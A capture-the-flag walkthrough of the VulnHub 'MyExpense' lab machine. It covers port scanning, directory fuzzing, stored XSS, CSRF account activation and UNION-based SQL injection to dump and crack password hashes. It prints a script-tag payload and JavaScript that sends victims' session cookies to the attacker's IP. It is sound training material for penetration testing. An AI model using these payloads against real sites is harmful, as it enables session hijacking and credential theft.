---
title: "MyExpense"
category: ["HTB", "Machines", "VulnHub", "MyExpense"]
---

# MyExpense

To set up this machine, we'll need some preliminary configuration since most Vulnhub OVAs are designed for VirtualBox, not VMware. So we'll change the network interface.

1. Set the machine to bridged mode
2. When launching the machine, press 'e' to edit boot tasks. We need to add this line:
![Pasted image 20251228194451](/VaultSite/wiki-images/Pasted%20image%2020251228194451.png)
3. Save and relaunch. Run `cd /etc/network` then `nano interfaces` to edit the network interface to match ours:
![Pasted image 20251228194623](/VaultSite/wiki-images/Pasted%20image%2020251228194623.png)
4. Now go to `cd /opt` and edit `nano login_admin_script_py`, adding our attacking machine's IP:
![Pasted image 20251228194932](/VaultSite/wiki-images/Pasted%20image%2020251228194932.png)
5. Repeat the same for `login_collab1_script.py`, `login_collab2_script.py`, and `login_manager_script.py`

Now we begin working on the machine.

---

We perform a ping to check if the machine is visible (we can find the machine's IP by checking it directly or running arpscan):
![Pasted image 20251229164318](/VaultSite/wiki-images/Pasted%20image%2020251229164318.png)
For organization, we create a directory called `myexpense`.

From the ping, we see TTL=64 which means LINUX:
![Pasted image 20251229164433](/VaultSite/wiki-images/Pasted%20image%2020251229164433.png)
![Pasted image 20251229164454](/VaultSite/wiki-images/Pasted%20image%2020251229164454.png)

We'll perform a port scan with:
`nmap -p- --open --sS --min-rate 5000 -vvv -n -Pn 192.168.111.34`

- Nmap explanation:
- `-p-`: Scan all TCP ports first
- `-sS`: Stealth scan
- `--min-rate 5000`: 5000 packets per second
- `-vvv`: Triple verbose for real-time output
- `-n`: No DNS resolution
- `-Pn`: Skip host discovery
![Pasted image 20251229170029](/VaultSite/wiki-images/Pasted%20image%2020251229170029.png)

Next we'll scan the specific ports to get version and service info:
`nmap -sC -sV -p80,32773,39687,53395,55153 192.168.111.34`
![Pasted image 20251229170313](/VaultSite/wiki-images/Pasted%20image%2020251229170313.png)

For more info, we could search for Apache httpd 2.4.25 on launchpad:
![Pasted image 20251229171137](/VaultSite/wiki-images/Pasted%20image%2020251229171137.png)

Let's check the web interface:
![Pasted image 20251229171257](/VaultSite/wiki-images/Pasted%20image%2020251229171257.png)
We see a login page and a tab to create an account if we don't have one.

We try the credentials from the machine's description but they don't work:
![Pasted image 20251229171344](/VaultSite/wiki-images/Pasted%20image%2020251229171344.png)

Now we'll perform fuzzing with GOBUSTER to find directories and files (dictionary may vary depending on what's updated, e.g., SecLists, Rockyou). Using `-t 20` for 20 threads to go faster:
`gobuster dir -u http://192.168.111.32/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20`

We find an interesting directory `/admin`:
![Pasted image 20251229172013](/VaultSite/wiki-images/Pasted%20image%2020251229172013.png)
We can't access it because we're not admin, but Wappalyzer shows PHP is used, so we'll brute force the admin directory for PHP files:
![Pasted image 20251229172221](/VaultSite/wiki-images/Pasted%20image%2020251229172221.png)

Adding to the gobuster command: the new URL `http://192.168.111.34/admin/` and `-x php` to search for this extension:
`gobuster dir -u http://192.168.111.32/admin/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php`
![Pasted image 20251229172450](/VaultSite/wiki-images/Pasted%20image%2020251229172450.png)

BINGO!! We found a file and see this:
![Pasted image 20251229172532](/VaultSite/wiki-images/Pasted%20image%2020251229172532.png)
We see the user 'samuel' from the description with his password. We try logging in but it says inactive:
![Pasted image 20251229172849](/VaultSite/wiki-images/Pasted%20image%2020251229172849.png)
Indeed, we can't.

We try creating a new account but the sign-up button is disabled:
![Pasted image 20251229173005](/VaultSite/wiki-images/Pasted%20image%2020251229173005.png)
Using Ctrl+Shift+C we inspect the page HTML and see the button has 'disabled' - we remove this and can now register:
![Pasted image 20251229173239](/VaultSite/wiki-images/Pasted%20image%2020251229173239.png)
The account is created but disabled:
![Pasted image 20251229173335](/VaultSite/wiki-images/Pasted%20image%2020251229173335.png)

We'll try injecting JavaScript in the First Name and Last Name fields to test for XSS vulnerability:
![Pasted image 20251229173802](/VaultSite/wiki-images/Pasted%20image%2020251229173802.png)
Checking admin.php shows an alert, confirming XSS vulnerability:
![Pasted image 20251229173850](/VaultSite/wiki-images/Pasted%20image%2020251229173850.png)

We'll check if any user regularly visits this page for work and attempt cookie hijacking via XSS.

Create a new user and start an HTTP server. For XSS injection:
`<script src="http://our_IP/pwned.js"></script>`
![Pasted image 20251229180737](/VaultSite/wiki-images/Pasted%20image%2020251229180737.png)

Now create pwned.js:
```javascript
// Declare request variable
var request = new XMLHttpRequest();

// Send GET request to our URL with the cookie
request.open('GET', 'http://192.168.111.45/?cookie=' + document.cookie)
request.send();
```
![Pasted image 20251229181153](/VaultSite/wiki-images/Pasted%20image%2020251229181153.png)
![Pasted image 20251229181227](/VaultSite/wiki-images/Pasted%20image%2020251229181227.png)

Go to Storage and change the cookie:
![Pasted image 20251229181303](/VaultSite/wiki-images/Pasted%20image%2020251229181303.png)
Refreshing shows nothing happened - it says it can only be done once:
![Pasted image 20251229181335](/VaultSite/wiki-images/Pasted%20image%2020251229181335.png)

This path is blocked - we could try deauthenticating the user but that's too intrusive.

Instead, we'll exploit the logged-in user to make the request we want. In admin.php, clicking 'inactive' for samuel shows:
![Pasted image 20251229182014](/VaultSite/wiki-images/Pasted%20image%2020251229182014.png)

We see that via GET when properly authenticated, it will activate the account:
![Pasted image 20251229182108](/VaultSite/wiki-images/Pasted%20image%2020251229182108.png)

Let's perform CSRF:
Copy the URL that enables samuel's account when accessed.

Edit pwned.js:
```javascript
// Declare request variable
var request = new XMLHttpRequest();

// Send GET request to the activation URL
request.open('GET', 'http://192.168.111.34/admin/admin.php?id=11&status=active')
request.send();
```
![Pasted image 20251229182739](/VaultSite/wiki-images/Pasted%20image%2020251229182739.png)
Restart the HTTP server:
![Pasted image 20251229182810](/VaultSite/wiki-images/Pasted%20image%2020251229182810.png)

When the request comes through, samuel will be active:
![Pasted image 20251229182857](/VaultSite/wiki-images/Pasted%20image%2020251229182857.png)
![Pasted image 20251229182910](/VaultSite/wiki-images/Pasted%20image%2020251229182910.png)

Let's try logging in:
![Pasted image 20251229182936](/VaultSite/wiki-images/Pasted%20image%2020251229182936.png)
![Pasted image 20251229182947](/VaultSite/wiki-images/Pasted%20image%2020251229182947.png)

We're in and see a community chat. There's an 'expense report' tab showing the €750 report we couldn't submit. Let's submit it:
![Pasted image 20251229183213](/VaultSite/wiki-images/Pasted%20image%2020251229183213.png)

Checking our account info, we see manager Manon Riviere from the chat who must approve the budget:
![Pasted image 20251229183316](/VaultSite/wiki-images/Pasted%20image%2020251229183316.png)

We'll try injecting the cookie script again since it's a chat - when others view it, the XSS will execute:
```javascript
// Declare request variable
var request = new XMLHttpRequest();

// Send GET request to our URL with the cookie on port 4646 to avoid conflict
request.open('GET', 'http://192.168.111.45:4646/?cookie=' + document.cookie)
request.send();
```
![Pasted image 20251229183854](/VaultSite/wiki-images/Pasted%20image%2020251229183854.png)
Start an HTTP server on port 4646.

In the chat, inject:
`<script src="http://192.168.111.45:4646/pwned.js"></script>`

# MyExpense

We start by seeing different cookies from other users  
![Pasted image 20251229184123](/VaultSite/wiki-images/Pasted%20image%2020251229184123.png)  
Now we'll keep testing until we find the one we're interested in  
![Pasted image 20251229184210](/VaultSite/wiki-images/Pasted%20image%2020251229184210.png)  
And we've found Manon Riviere's cookie  
![Pasted image 20251229184228](/VaultSite/wiki-images/Pasted%20image%2020251229184228.png)  

We see new tabs for expense reports. Let's check the report we just submitted. It's validated but not yet approved  
![Pasted image 20251229184320](/VaultSite/wiki-images/Pasted%20image%2020251229184320.png)  

If we go to Manon's user, we see that as a manager she has Paul Baudouin, who in the admin.php table has the Financial Approver role  
![Pasted image 20251229184443](/VaultSite/wiki-images/Pasted%20image%2020251229184443.png)  
Someone is in the chat but doesn't seem to be reading it  

We see another tab labeled "Rennes" with some tables that appear vulnerable to SQLi  
![Pasted image 20251229184645](/VaultSite/wiki-images/Pasted%20image%2020251229184645.png)  
Adding a single quote gives us an error (most likely we're opening a quote but not commenting out another quote behind it, or maybe they just did "where id=2" and nothing else)  
![Pasted image 20251229184726](/VaultSite/wiki-images/Pasted%20image%2020251229184726.png)  

We see that if we try to comment without the quote, no error appears  
![Pasted image 20251229184905](/VaultSite/wiki-images/Pasted%20image%2020251229184905.png)  

Let's apply data sorting with ORDER BY  
We try with 3 but get an error, but with 2 it returns correctly  
![Pasted image 20251229185037](/VaultSite/wiki-images/Pasted%20image%2020251229185037.png)  
![Pasted image 20251229185022](/VaultSite/wiki-images/Pasted%20image%2020251229185022.png)  
We can take advantage of the error to guess the number of columns  

We do a UNION SELECT and see it returns a response above the table. Let's try to get the database user  
![Pasted image 20251229185204](/VaultSite/wiki-images/Pasted%20image%2020251229185204.png)  
![Pasted image 20251229185246](/VaultSite/wiki-images/Pasted%20image%2020251229185246.png)  

Now let's try to list the databases  
![Pasted image 20251229185332](/VaultSite/wiki-images/Pasted%20image%2020251229185332.png)  
The "myexpense" database catches our attention. Let's list its tables  
![Pasted image 20251229185427](/VaultSite/wiki-images/Pasted%20image%2020251229185427.png)  

We see a "user" table, so let's list its columns  
![Pasted image 20251229185502](/VaultSite/wiki-images/Pasted%20image%2020251229185502.png)  
We can see user and password fields. Let's dump the values from these two columns  
We'll assume the web application is using the myexpense database  
![Pasted image 20251229185616](/VaultSite/wiki-images/Pasted%20image%2020251229185616.png)  
![Pasted image 20251229185739](/VaultSite/wiki-images/Pasted%20image%2020251229185739.png)  

We see the credentials but they're hashed, so let's try to crack them  
![Pasted image 20251229185810](/VaultSite/wiki-images/Pasted%20image%2020251229185810.png)  
We find Paul's password is "HackMe"  
We log in with his account  
![Pasted image 20251229185852](/VaultSite/wiki-images/Pasted%20image%2020251229185852.png)  

When logging back in with Samuel's account, we can see the flag at the top  
![Pasted image 20251229185935](/VaultSite/wiki-images/Pasted%20image%2020251229185935.png)
